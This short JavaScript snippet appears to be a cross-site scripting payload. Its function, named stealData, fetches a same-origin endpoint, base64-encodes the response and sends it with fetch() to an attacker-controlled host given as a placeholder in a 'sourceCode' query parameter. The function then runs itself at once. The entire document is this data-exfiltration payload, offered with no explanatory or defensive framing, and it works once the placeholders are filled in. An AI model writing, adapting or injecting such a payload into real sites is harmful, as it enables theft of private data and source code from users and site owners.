function stealData()
{
    var uri = "/<TARGET-ENDPOINT>";

    xhr = new XMLHttpRequest();
    xhr.open("GET", uri, true);
    xhr.send(null)

    xhr.onreadystatechange = function()
    {
        if (xhr.readyState == XMLHttpRequest.DONE)
        {
            var dataResponse = btoa(xhr.responseText)

            fetch('http://<HOST>/?sourceCode=' + dataResponse)
        }
    }
}

stealData();